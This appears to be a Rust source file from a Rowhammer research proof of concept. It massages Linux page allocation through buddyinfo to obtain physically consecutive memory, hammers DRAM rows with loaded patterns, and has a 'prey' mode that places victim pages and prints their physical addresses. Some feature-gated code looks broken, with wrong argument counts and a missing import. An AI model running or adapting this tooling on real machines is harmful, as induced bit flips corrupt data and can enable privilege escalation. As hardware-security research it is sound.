use std::{
    env,
    io::Read,
    process::Command,
    ptr::null_mut,
    sync::{
        atomic::{AtomicBool, Ordering},
        Arc,
    },
    thread,
    time::Duration,
};

use anyhow::{bail, Context};
use bs_poc::{
    forge::{load_pattern_from_json, Hammerer, Hammering, PatternAddressMapper},
    jitter::AggressorPtr,
    memory::{DRAMAddr, LinuxPageMap, PreAllocatedVictimMemory, VirtToPhysResolver},
    util::{BlacksmithConfig, MemConfiguration},
    victim::HammerVictimMemCheck,
};
use clap::Parser;
use libc::{c_void, MAP_ANONYMOUS, MAP_POPULATE, MAP_PRIVATE, PROT_READ, PROT_WRITE};
use log::{debug, error, info};
use proc_getter::buddyinfo::*;
use std::fs::File;
use std::io::Write;

/// Search for a pattern in a file and display the lines that contain it.
#[derive(Debug, Parser)]
struct CliArgs {
    ///The bait-alloc mode.
    #[clap(long = "mode", default_value = "bait")]
    mode: BaitMode,
    ///The BlacksmithConfig
    #[clap(long = "config")]
    config: String,
    /// The JSON file containing hammering patterns to load
    #[clap(long = "load-json", default_value = "fuzz-summary.json")]
    load_json: String,
    /// The pattern ID to load from the JSON file
    #[clap(long = "pattern")]
    pattern: String,
    /// The mapping ID to load from the JSON file (optional, will determine most optimal pattern if omitted)
    #[clap(long = "mapping")]
    mapping: Option<String>,
}

#[derive(clap::ValueEnum, Clone, Debug)]
enum BaitMode {
    Bait,
    MonitorBuddyInfo,
    Prey,
}

const PREY_PAGE_COUNT: usize = 500;
const PAGE_LEN: usize = 4 * KB;

fn prog() -> Option<String> {
    env::args().next().as_ref().cloned()
}

/// Send a signal `sig` to the process `pid`
fn signal(sig: &str, pid: u32) -> anyhow::Result<()> {
    let mut kill = Command::new("kill")
        .args(["-s", sig, &pid.to_string()])
        .spawn()?;
    kill.wait()?;
    Ok(())
}

const KB: usize = 1 << 10;
const MB: usize = 1 << 20;

/// Read /proc/pagetypeinfo to string
fn read_pagetypeinfo() -> anyhow::Result<String> {
    let mut s = String::new();
    let mut f = std::fs::File::open("/proc/pagetypeinfo")?;
    f.read_to_string(&mut s)?;
    Ok(s)
}

/// Log /proc/pagetypeinfo to debug log
fn log_pagetypeinfo() {
    debug!("{:?}", read_pagetypeinfo());
}

/// A small wrapper around buddyinfo() from proc_getter, which is not convertible to anyhow::Result
fn get_buddyinfo() -> anyhow::Result<Vec<BuddyInfo>> {
    match buddyinfo() {
        Ok(b) => Ok(b),
        Err(e) => bail!("{:?}", e),
    }
}

fn get_normal_page_nums() -> anyhow::Result<[usize; 11]> {
    let zones = get_buddyinfo()?;
    /*
    let mut free_space = 0;
    let zone = zones
        .iter()
        .find(|z| z.zone().eq("Normal"))
        .context("Zone 'Normal' not found")?;
    return Ok(zone.page_nums().clone());*/
    fn add_acc(mut l: [usize; 11], r: &[usize; 11]) -> [usize; 11] {
        for i in 0..11 {
            l[i] += r[i];
        }
        l
    }
    let pages = zones.iter().fold([0; 11], |mut acc, next| {
        acc = add_acc(acc, next.page_nums());
        acc
    });
    Ok(pages)
}

fn diff_arrs<const S: usize>(l: &[usize; S], r: &[usize; S]) -> [i64; S] {
    let mut diffs = [0_i64; S];
    let mut i = 0;
    for (&l, &r) in l.iter().zip(r) {
        diffs[i] = l as i64 - r as i64;
        i += 1;
    }
    diffs
}

unsafe fn mmap_block(addr: *mut c_void, len: usize) -> *mut libc::c_void {
    let v = libc::mmap(
        addr,
        len,
        PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
        -1,
        0,
    );
    assert_ne!(v as i64, -1, "mmap: {}", std::io::Error::last_os_error());
    libc::memset(v, 0x11, len);
    v
}

#[cfg(feature = "spec_hammer")]
unsafe fn determine_locked_2mb_blocks() -> anyhow::Result<usize> {
    let mut locked = usize::MAX;
    for _repetition in 0..10 {
        let mut allocations = [null_mut(); 50000];
        const MAX_REPETITIONS: usize = 10;
        let mut split_allocations = 0;
        for i in 0..50000 {
            //log_pagetypeinfo();
            let buddy_before = get_normal_page_nums()?;
            let v = mmap_block(2 * MB);
            allocations[i] = v;
            let buddy_after = get_normal_page_nums()?;
            let diff = diff_arrs(&buddy_before, &buddy_after);
            locked = min(locked, buddy_before[9]);
            if diff[9] < 0 {
                // the last allocation increased the block count -> we encountered a split
                log_pagetypeinfo();
                split_allocations += 1;
                debug!("  {:?}", buddy_before);
                debug!("- {:?}", buddy_after);
                debug!("= {:?}", diff);
            }
            if split_allocations == MAX_REPETITIONS {
                debug!("Allocated {} blocks before hitting threshold", i);
                break;
            }
        }
        for v in allocations {
            libc::munmap(v, 2 * MB);
        }
    }
    Ok(locked)
}

#[cfg(feature = "spec_hammer")]
unsafe fn mmap_consecutive_2mb_block() -> anyhow::Result<*mut libc::c_void> {
    let locked_2mb_blocks = determine_locked_2mb_blocks()?;
    info!("Locked 2MB blocks: {}", locked_2mb_blocks);
    let mut available_2mb_blocks = usize::MAX;
    let mut allocations = [null_mut(); 50000];
    let mut i = 0;
    while available_2mb_blocks > locked_2mb_blocks {
        let buddy_before = get_normal_page_nums()?;
        let v = mmap_block(2 * MB);
        let buddy_after = get_normal_page_nums()?;
        let diff = diff_arrs(&buddy_before, &buddy_after);
        allocations[i] = v;
        i += 1;
        available_2mb_blocks = get_normal_page_nums()?[9];
        if available_2mb_blocks <= locked_2mb_blocks {
            log_pagetypeinfo();
            debug!("  {:?}", buddy_before);
            debug!("- {:?}", buddy_after);
            debug!("= {:?}", diff);
        }
    }
    debug!("hit thresh");
    let buddy_before = get_normal_page_nums()?;
    let v = mmap_block(2 * MB);
    let buddy_after = get_normal_page_nums()?;
    let diff = diff_arrs(&buddy_before, &buddy_after);
    info!("  {:?}", buddy_before);
    info!("- {:?}", buddy_after);
    info!("= {:?}", diff);
    for ptr in allocations {
        libc::munmap(ptr, 2 * MB);
    }
    Ok(v)
}

#[cfg(feature = "buddyinfo")]
unsafe fn mmap_consecutive_2mb_block(base_msb: AggressorPtr) -> anyhow::Result<*mut libc::c_void> {
    fn is_block10_candidate(diff: &[i64; 11]) -> bool {
        if diff[10] != 1 {
            return false;
        }
        let low_order_sum = diff[..8]
            .iter()
            .enumerate()
            .filter(|(_, &n)| n > 0)
            .fold(0, |acc, (order, n)| acc + (1 << order) * n);
        let low_order_sum = low_order_sum as usize * 4 * KB;
        low_order_sum < 2 * MB
    }
    let hugeblock_len = 1024 * MB;
    log_pagetypeinfo();
    debug!("will alloc 1 GB block");
    // Open the file in write mode, creating it if it doesn't exist or truncating it if it does.
    let mut file = File::create("dmesg.log")?;
    // Write an empty string to the file.
    write!(file, "")?;
    let v = mmap_block(null_mut(), hugeblock_len);
    debug!("1 GB allocated");
    let mut pages = [null_mut(); 50000];
    let mut v1 = None;
    let mut diff = [0; 11];
    for i in 0..50000 {
        log_pagetypeinfo();
        let blocks_before = get_normal_page_nums()?;
        let v = mmap_block(base_msb as *mut c_void, 2 * MB);
        log_pagetypeinfo();
        let blocks_after = get_normal_page_nums()?;
        diff = diff_arrs(&blocks_before, &blocks_after);
        debug!("  {:?}", blocks_before);
        debug!("- {:?}", blocks_after);
        debug!("= {:?}", diff);
        if is_block10_candidate(&diff) {
            debug!("allocated block from order 10 block");
            v1 = Some(v);
            break;
        } else {
            // make place for the next allocation at base_msb. Releasing and then allocating the same block will probably lead
            // to the allocation being reused, so we should be fine. We do this to ensure that our final allocation
            // will be mapped to `base_msb`, which is needed for virt-to-phys mapping.
            libc::munmap(v, 2 * MB);
            let v = mmap_block(null_mut(), 2 * MB);
            pages[i] = v;
            info!("Moved dummy allocation to {:?}", v);
        }
    }
    assert_ne!(diff[10], 0);

    libc::munmap(v, hugeblock_len);
    for p in pages {
        if p.is_null() {
            continue;
        }
        libc::munmap(p, 2 * MB);
    }

    v1.context("Block allocation failed")
}

unsafe fn get_consec_pfns(
    resolver: &mut LinuxPageMap,
    v: *const libc::c_void,
) -> anyhow::Result<Vec<u64>> {
    if (v as u64) & 0xFFF != 0 {
        bail!("Address is not page-aligned: 0x{:x}", v as u64);
    }
    debug!("Get consecutive PFNs for vaddr 0x{:x}", v as u64);
    let mut phys_prev = resolver.get_phys(v as u64)?;
    let mut consecs = vec![phys_prev];
    for offset in (PAGE_LEN..2 * MB).step_by(PAGE_LEN) {
        let virt = (v as *const u8).add(offset);
        let phys = resolver.get_phys(virt as u64)?;
        if phys != phys_prev + PAGE_LEN as u64 {
            consecs.push(phys_prev + PAGE_LEN as u64);
            consecs.push(phys);
        }
        phys_prev = phys;
    }
    consecs.push(phys_prev + PAGE_LEN as u64);
    debug!("PFN check done");
    Ok(consecs)
}

unsafe fn mode_monitor_buddyinfo() -> anyhow::Result<()> {
    loop {
        let before = get_normal_page_nums()?;
        thread::sleep(std::time::Duration::from_secs(1));
        let after = get_normal_page_nums()?;
        let diff = diff_arrs(&before, &after);
        //info!("  {:?}", blocks_before);
        //info!("- {:?}", blocks_after);
        info!("= {:?}", diff);
    }
}

fn find_mapping_base(
    mapping: PatternAddressMapper,
    mem_config: MemConfiguration,
    base_msb: *const u8,
) -> *const u8 {
    let addr = DRAMAddr::new(mapping.bank_no, mapping.min_row, 0);
    addr.to_virt(base_msb, mem_config)
}

unsafe fn mode_bait(args: CliArgs, mut resolver: LinuxPageMap) -> anyhow::Result<()> {
    let config = BlacksmithConfig::from_jsonfile(&args.config).with_context(|| "from_jsonfile")?;
    let mem_config =
        MemConfiguration::from_bitdefs(config.bank_bits, config.row_bits, config.col_bits);

    const BASE_MSB: *const u8 = 0x2000000000 as *const u8;

    // load patterns from JSON
    let pattern = load_pattern_from_json(args.load_json.clone(), args.pattern.clone())?;
    let mapping = match &args.mapping {
        Some(mapping) => pattern.find_mapping(&mapping).expect("mapping not found"),
        None => pattern
            .determine_most_effective_mapping()
            .expect("pattern contains no mapping"),
    };

    info!("Using mapping {:?}", mapping);

    // find offset from base and mapping start
    let mapping_base = find_mapping_base(mapping.clone(), mem_config, BASE_MSB as *const u8);
    let mapping_end = DRAMAddr::new(mapping.bank_no, mapping.max_row, 0)
        .to_virt(BASE_MSB as *const u8, mem_config);
    let num_rows = mapping_end as usize - mapping_base as usize + 1;
    //let flip_aggr_offset = find_flip_aggr_offset(mapping.clone(), mem_config)?;
    info!("base_msb: {:?}", BASE_MSB as *const u8);
    info!("determined mapping base as {:?}", mapping_base);
    info!("mapping length: {}", num_rows);
    //info!("determined flip aggr offset as {}", flip_aggr_offset);

    loop {
        //log_pagetypeinfo();
        //let prog = prog().expect("prog");
        //let child = Command::new(prog)
        //    .stdout(Stdio::piped())
        //    .args(["--mode", "prey"])
        //    .spawn()?;
        let v = mmap_consecutive_2mb_block(mapping_base)?;

        let addr1 = DRAMAddr::from_virt(v as *const u8, &mem_config);
        let consecs = get_consec_pfns(&mut resolver, v);
        let success = match &consecs {
            Ok(consecs) => {
                info!("PFNs {:?}", consecs);
                let first_block_bytes = (consecs[1] - consecs[0]) as usize;
                info!(
                    "Allocated a consecutive {} KB block at {:#02x}",
                    first_block_bytes / 1024,
                    v as u64
                );
                first_block_bytes >= 1 * MB
            }
            Err(e) => {
                error!("PFN check failed: {:?}", e);
                false
            }
        };
        if !success {
            thread::sleep(Duration::from_secs(2));
            continue;
        }
        // We assume we have successfully allocated a consecutive 1 MB block
        let v = v as AggressorPtr;
        let mapping_min = DRAMAddr::new(mapping.bank_no, mapping.min_row, 0);
        let mapping_max = DRAMAddr::new(mapping.bank_no, mapping.max_row, 0);
        info!(
            "mapping range: [{:?}, {:?}], [{:?}, {:?}]",
            mapping_min,
            mapping_max,
            mapping_min.to_virt(BASE_MSB, mem_config),
            mapping_max.to_virt(BASE_MSB, mem_config)
        );
        for page_offset in 0..(1 * MB / PAGE_LEN) {
            let addr =
                DRAMAddr::from_virt((v as AggressorPtr).add(page_offset * PAGE_LEN), &mem_config);
            info!("page {}: {:?}", page_offset, addr);
        }

        //mapping.adapt_for_consec(v as AggressorPtr, mem_config);

        for (aggr, addr) in &mapping.aggressor_to_addr {
            info!(
                "{:?}: {:?}, {:?}",
                aggr,
                addr,
                addr.to_virt(BASE_MSB as AggressorPtr, mem_config)
            );
        }

        let hammerer = Hammerer::new(
            mem_config,
            pattern.clone(),
            mapping.clone(),
            BASE_MSB as AggressorPtr,
        )?;
        let memory = PreAllocatedVictimMemory::new(v as *mut u8, 1 * MB)?;
        let mut victim = HammerVictimMemCheck::new(mem_config.clone(), &memory);

        let res = hammerer.hammer(&mut victim);
        print!("{:?}", res);

        // signal child process
        //signal("INT", child.id())?;
        //let _output = child.wait_with_output().expect("child wait");
        //thread::sleep(std::time::Duration::from_secs(2));

        // cleanup
        libc::munmap(v as *mut c_void, 2 * MB);
        return Ok(());
    }
}

// TODO entweder malloc arena vergiften oder viel speicher alloziieren und wenig freigeben
unsafe fn mode_prey(mut resolver: LinuxPageMap) -> anyhow::Result<()> {
    // setup signal handler
    let waiting = Arc::new(AtomicBool::new(true));
    let waiting_sigh = waiting.clone();
    ctrlc::set_handler(move || {
        waiting_sigh.store(false, Ordering::SeqCst);
    })
    .expect("ctrlc setup failed");

    // wait for signal
    while waiting.load(Ordering::SeqCst) {
        thread::sleep(std::time::Duration::from_millis(1));
    }

    // allocate 500 4K pages
    let mut virt = [std::ptr::null_mut(); PREY_PAGE_COUNT];
    let mut phys = [0_u64; PREY_PAGE_COUNT];

    // allocate pages
    for i in 0..PREY_PAGE_COUNT {
        let v = libc::mmap(
            null_mut(),
            PAGE_LEN,
            PROT_READ | PROT_WRITE,
            MAP_PRIVATE | MAP_ANONYMOUS,
            -1,
            0,
        );
        //let v = libc::malloc(PAGE_LEN);
        libc::memset(v, 0_i32, PAGE_LEN);
        let p = resolver
            .get_phys(v as u64)
            .context("virt_to_phys failed. Are we root?")?;
        phys[i] = p;
        virt[i] = v;
    }

    // log phys addrs to stdout
    for i in 0..PREY_PAGE_COUNT {
        println!("{}", phys[i]);
    }

    for i in 0..PREY_PAGE_COUNT {
        libc::munmap(virt[i], PAGE_LEN);
    }

    Ok(())
}

unsafe fn _main() -> anyhow::Result<()> {
    env_logger::init();
    let args = CliArgs::parse();

    let resolver = LinuxPageMap::new()?;

    match args.mode {
        BaitMode::Bait => mode_bait(args, resolver),
        BaitMode::Prey => mode_prey(resolver),
        BaitMode::MonitorBuddyInfo => mode_monitor_buddyinfo(),
    }
}

fn main() -> anyhow::Result<()> {
    unsafe { _main() }
}
